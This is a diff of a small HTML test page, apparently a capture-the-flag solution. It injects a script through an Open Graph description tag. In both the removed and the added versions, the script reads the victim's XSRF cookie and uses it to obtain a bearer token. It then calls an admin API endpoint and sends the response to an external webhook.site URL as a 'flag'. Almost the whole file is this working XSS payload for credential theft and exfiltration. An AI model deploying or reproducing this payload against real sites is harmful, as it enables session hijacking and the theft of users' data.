@@ -1,52 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>My OG Test</title>
-  <meta property="og:title" content="My Test Page" />
   <meta property="og:description" content='<script>
-    (async function () {
-      const webhook = "https://webhook.site/a1c566df-0b8c-422e-b3bb-eb97cb87ff8d";
+const u = "https://webhook.site/a1c566df-0b8c-422e-b3bb-eb97cb87ff8d";
+const c = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
+if (!c) return;
 
-      function getXsrf() {
-        try {
-          return decodeURIComponent(document.cookie.split("; ").find(c => c.startsWith("XSRF-TOKEN=")).split("=")[1]);
-        } catch { return null; }
-      }
-
-      const token = getXsrf();
-      if (!token) return;
-
-      try {
-        const res1 = await fetch("/generate-token", {
-          method: "POST",
-          headers: {
-            "X-XSRF-TOKEN": token,
-            "X-Requested-With": "XMLHttpRequest"
-          },
-          credentials: "include"
-        });
-        const json = await res1.json();
-        const bearer = json.token;
-
-        const res2 = await fetch("/api/admin/sup3rs3cr3t", {
-          headers: {
-            "Authorization": "Bearer " + bearer,
-            "X-Requested-With": "XMLHttpRequest"
-          },
-          credentials: "include"
-        });
-        const flag = await res2.text();
-        new Image().src = webhook + "?flag=" + encodeURIComponent(flag);
-      } catch (e) {
-        new Image().src = webhook + "?error=" + encodeURIComponent(e.message);
-      }
-    })();
-  </script>' />
-  <meta property="og:image" content="https://example.com/image.jpg" />
-  <meta property="og:url" content="https://username.github.io/repo-name/" />
+fetch("/generate-token", {
+  method: "POST",
+  headers: { "X-XSRF-TOKEN": decodeURIComponent(c[1]) },
+  credentials: "include"
+})
+.then(r => r.json())
+.then(j => fetch("/api/admin/sup3rs3cr3t", {
+  headers: { "Authorization": "Bearer " + j.token },
+  credentials: "include"
+}))
+.then(r => r.text())
+.then(f => new Image().src = u + "?flag=" + encodeURIComponent(f))
+.catch(e => new Image().src = u + "?err=" + encodeURIComponent(e.message));
+</script>' />
 </head>
-<body>
-  <h1>Hello Open Graph</h1>
-</body>
+<body><h1>Hello</h1></body>
 </html>
